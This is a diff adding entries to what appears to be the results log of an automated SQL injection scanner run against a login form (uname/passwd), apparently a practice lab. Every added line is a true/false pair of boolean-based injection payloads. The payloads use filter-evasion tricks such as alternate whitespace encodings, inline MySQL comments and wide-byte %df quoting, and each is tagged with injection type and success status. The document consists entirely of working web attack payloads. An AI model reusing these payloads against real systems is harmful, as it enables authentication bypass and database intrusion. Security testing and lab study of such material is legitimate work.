@@ -80,3 +80,66 @@
 [$74$] 可能存在字符型注入  [1536] payload : [uname=admin&passwd=123\%a0xor%a0{``1=1}%23&submit=Submit]
 [$95$] 可能存在字符型注入  [1536] payload : [uname=admin&passwd=123")%a0xor%a01 &submit=Submit]
 [$99$] 可能存在字符型注入  [1536] payload : [uname=admin&passwd=123")%a0xor%a01&&1%23&submit=Submit]
+{'payload': "uname=admin'%20and%20{``1=1}%23&passwd=123&submit=Submit-----uname=admin'%20and%20{``1=2}%23&passwd=123&submit=Submit", 'type': '字符型', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin'%0b%0c%0b%0dand%0b%0c%0b%0d2<<1--+&passwd=123&submit=Submit-----uname=admin'%0b%0c%0b%0dand%0b%0c%0b%0d0<<2--+&passwd=123&submit=Submit", 'type': '字符型', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123'%0b%0c%0b%0dxor%0b%0c%0b%0d1--+&submit=Submit-----uname=admin&passwd=123'%0b%0c%0b%0dxor%0b%0c%0b%0d0--+&submit=Submit", 'type': '字符型', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123'%20xor%201||1--+&submit=Submit-----uname=admin&passwd=123'%20xor%200||0--+&submit=Submit", 'type': '字符型', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin'&passwd=123&submit=Submit-----uname=admin'&passwd=123&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': 'uname=admin%df%27&passwd=123&submit=Submit-----uname=admin%df%27&passwd=123&submit=Submit', 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': 'uname=admin\\&passwd=123&submit=Submit-----uname=admin\\&passwd=123&submit=Submit', 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123'&submit=Submit-----uname=admin&passwd=123'&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': 'uname=admin&passwd=123%df%27&submit=Submit-----uname=admin&passwd=123%df%27&submit=Submit', 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': 'uname=admin&passwd=123\\&submit=Submit-----uname=admin&passwd=123\\&submit=Submit', 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin'%a0xor%a01 &passwd=123&submit=Submit-----uname=admin'%a0xor%a00 &passwd=123&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin'/***/xor/***//*!and/*/**//*!/*!1*/ &passwd=123&submit=Submit-----uname=admin'/***/xor/***//*!and/*/**//*!/*!0*/ &passwd=123&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin'/***/xor/***/1 &passwd=123&submit=Submit-----uname=admin'/***/xor/***/0 &passwd=123&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin'%a0and%a01|1 &passwd=123&submit=Submit-----uname=admin'%a0and%a00|0 &passwd=123&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin'%20and%201||1 &passwd=123&submit=Submit-----uname=admin'%20and%200||0 &passwd=123&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin'%09xor%091&&1 &passwd=123&submit=Submit-----uname=admin'%09xor%090&&1 &passwd=123&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin'/***/and/***/1^1 &passwd=123&submit=Submit-----uname=admin'/***/and/***/1^0 &passwd=123&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin')%0b%0c%0b%0dand%0b%0c%0b%0d1--+&passwd=123&submit=Submit-----uname=admin')%0b%0c%0b%0dand%0b%0c%0b%0d0--+&passwd=123&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin')%0b%0c%0b%0dxor%0b%0c%0b%0d1 like 1%23&passwd=123&submit=Submit-----uname=admin')%0b%0c%0b%0dxor%0b%0c%0b%0d1 like 2%23&passwd=123&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin')%0b%0c%0b%0dand%0b%0c%0b%0d/*!and/*/**//*!/*!1*/%23&passwd=123&submit=Submit-----uname=admin')%0b%0c%0b%0dand%0b%0c%0b%0d/*!and/*/**//*!/*!0*/%23&passwd=123&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin')%a0and%a0{``1=1} &passwd=123&submit=Submit-----uname=admin')%a0and%a0{``1=2} &passwd=123&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin') xor 1 &passwd=123&submit=Submit-----uname=admin') xor 0 &passwd=123&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin') xor 2<<1 &passwd=123&submit=Submit-----uname=admin') xor 0<<2 &passwd=123&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin')%a0and%a01|1%23&passwd=123&submit=Submit-----uname=admin')%a0and%a00|0%23&passwd=123&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin')%20and%201||1--+&passwd=123&submit=Submit-----uname=admin')%20and%200||0--+&passwd=123&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin')/***/xor/***/1&&1%23&passwd=123&submit=Submit-----uname=admin')/***/xor/***/0&&1%23&passwd=123&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin')%a0and%a01^1 &passwd=123&submit=Submit-----uname=admin')%a0and%a01^0 &passwd=123&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123'%a0xor%a0/*!and/*/**//*!/*!1*/ &submit=Submit-----uname=admin&passwd=123'%a0xor%a0/*!and/*/**//*!/*!0*/ &submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123'%20xor%20{``1=1} &submit=Submit-----uname=admin&passwd=123'%20xor%20{``1=2} &submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123'%09and%091 &submit=Submit-----uname=admin&passwd=123'%09and%090 &submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123'%a0xor%a02<<1%23&submit=Submit-----uname=admin&passwd=123'%a0xor%a00<<2%23&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123'%a0xor%a01|1 &submit=Submit-----uname=admin&passwd=123'%a0xor%a00|0 &submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123'/***/xor/***/1&&1--+&submit=Submit-----uname=admin&passwd=123'/***/xor/***/0&&1--+&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123'%09xor%091^1 &submit=Submit-----uname=admin&passwd=123'%09xor%091^0 &submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123')%09and%091 &submit=Submit-----uname=admin&passwd=123')%09and%090 &submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123')%0b%0c%0b%0dand%0b%0c%0b%0d1 like 1--+&submit=Submit-----uname=admin&passwd=123')%0b%0c%0b%0dand%0b%0c%0b%0d1 like 2--+&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123')/***/and/***//*!and/*/**//*!/*!1*/--+&submit=Submit-----uname=admin&passwd=123')/***/and/***//*!and/*/**//*!/*!0*/--+&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123')%a0xor%a0{``1=1} &submit=Submit-----uname=admin&passwd=123')%a0xor%a0{``1=2} &submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123')%20xor%201 &submit=Submit-----uname=admin&passwd=123')%20xor%200 &submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123')%a0and%a02<<1 &submit=Submit-----uname=admin&passwd=123')%a0and%a00<<2 &submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123')%a0xor%a01|1--+&submit=Submit-----uname=admin&passwd=123')%a0xor%a00|0--+&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123')/***/xor/***/1||1 &submit=Submit-----uname=admin&passwd=123')/***/xor/***/0||0 &submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123')/***/xor/***/1&&1 &submit=Submit-----uname=admin&passwd=123')/***/xor/***/0&&1 &submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': "uname=admin&passwd=123')%20xor%201^1%23&submit=Submit-----uname=admin&passwd=123')%20xor%201^0%23&submit=Submit", 'type': 'SQL syntax', 'success': 'True', 'waf': 'None'}
+{'payload': 'uname=admin%df%22&passwd=123&submit=Submit-----uname=admin%df%22&passwd=123&submit=Submit', 'type': '', 'success': 'Maybe', 'waf': 'None'}
+{'payload': 'uname=admin&passwd=123%df%22&submit=Submit-----uname=admin&passwd=123%df%22&submit=Submit', 'type': '', 'success': 'Maybe', 'waf': 'None'}
+{'payload': 'uname=admin%a0xor%a01|1&passwd=123&submit=Submit-----uname=admin%a0xor%a00|0&passwd=123&submit=Submit', 'type': '数字型', 'success': 'Maybe', 'waf': 'None'}
+{'payload': 'uname=admin&passwd=123%a0and%a01||1&submit=Submit-----uname=admin&passwd=123%a0and%a00||0&submit=Submit', 'type': '数字型', 'success': 'Maybe', 'waf': 'None'}
+{'payload': 'uname=admin"%a0xor%a02<<1--+&passwd=123&submit=Submit-----uname=admin"%a0xor%a00<<2--+&passwd=123&submit=Submit', 'type': '字符型', 'success': 'Maybe', 'waf': 'None'}
+{'payload': 'uname=admin"%a0and%a01&&1 &passwd=123&submit=Submit-----uname=admin"%a0and%a00&&1 &passwd=123&submit=Submit', 'type': '字符型', 'success': 'Maybe', 'waf': 'None'}
+{'payload': 'uname=admin\\%a0and%a01--+&passwd=123&submit=Submit-----uname=admin\\%a0and%a00--+&passwd=123&submit=Submit', 'type': '字符型', 'success': 'Maybe', 'waf': 'None'}
+{'payload': 'uname=admin")%a0xor%a0{``1=1}%23&passwd=123&submit=Submit-----uname=admin")%a0xor%a0{``1=2}%23&passwd=123&submit=Submit', 'type': '字符型', 'success': 'Maybe', 'waf': 'None'}
+{'payload': 'uname=admin")%a0and%a01||1 &passwd=123&submit=Submit-----uname=admin")%a0and%a00||0 &passwd=123&submit=Submit', 'type': '字符型', 'success': 'Maybe', 'waf': 'None'}
+{'payload': 'uname=admin")%a0and%a01&&1 &passwd=123&submit=Submit-----uname=admin")%a0and%a00&&1 &passwd=123&submit=Submit', 'type': '字符型', 'success': 'Maybe', 'waf': 'None'}
+{'payload': 'uname=admin&passwd=123"%a0xor%a0/*!and/*/**//*!/*!1*/%23&submit=Submit-----uname=admin&passwd=123"%a0xor%a0/*!and/*/**//*!/*!0*/%23&submit=Submit', 'type': '字符型', 'success': 'Maybe', 'waf': 'None'}
+{'payload': 'uname=admin&passwd=123"%a0and%a01 &submit=Submit-----uname=admin&passwd=123"%a0and%a00 &submit=Submit', 'type': '字符型', 'success': 'Maybe', 'waf': 'None'}
+{'payload': 'uname=admin&passwd=123"%a0xor%a01||1--+&submit=Submit-----uname=admin&passwd=123"%a0xor%a00||0--+&submit=Submit', 'type': '字符型', 'success': 'Maybe', 'waf': 'None'}
+{'payload': 'uname=admin&passwd=123\\%a0and%a0/*!and/*/**//*!/*!1*/--+&submit=Submit-----uname=admin&passwd=123\\%a0and%a0/*!and/*/**//*!/*!0*/--+&submit=Submit', 'type': '字符型', 'success': 'Maybe', 'waf': 'None'}
+{'payload': 'uname=admin&passwd=123\\%a0xor%a01^1%23&submit=Submit-----uname=admin&passwd=123\\%a0xor%a01^0%23&submit=Submit', 'type': '字符型', 'success': 'Maybe', 'waf': 'None'}
+{'payload': 'uname=admin&passwd=123")%a0and%a01 &submit=Submit-----uname=admin&passwd=123")%a0and%a00 &submit=Submit', 'type': '字符型', 'success': 'Maybe', 'waf': 'None'}
+{'payload': 'uname=admin&passwd=123")%a0xor%a0/*!and/*/**//*!/*!1*/--+&submit=Submit-----uname=admin&passwd=123")%a0xor%a0/*!and/*/**//*!/*!0*/--+&submit=Submit', 'type': '字符型', 'success': 'Maybe', 'waf': 'None'}
+{'payload': 'uname=admin&passwd=123")%a0and%a01||1%23&submit=Submit-----uname=admin&passwd=123")%a0and%a00||0%23&submit=Submit', 'type': '字符型', 'success': 'Maybe', 'waf': 'None'}
+{'payload': 'uname=admin&passwd=123")%a0xor%a01^1 &submit=Submit-----uname=admin&passwd=123")%a0xor%a01^0 &submit=Submit', 'type': '字符型', 'success': 'Maybe', 'waf': 'None'}
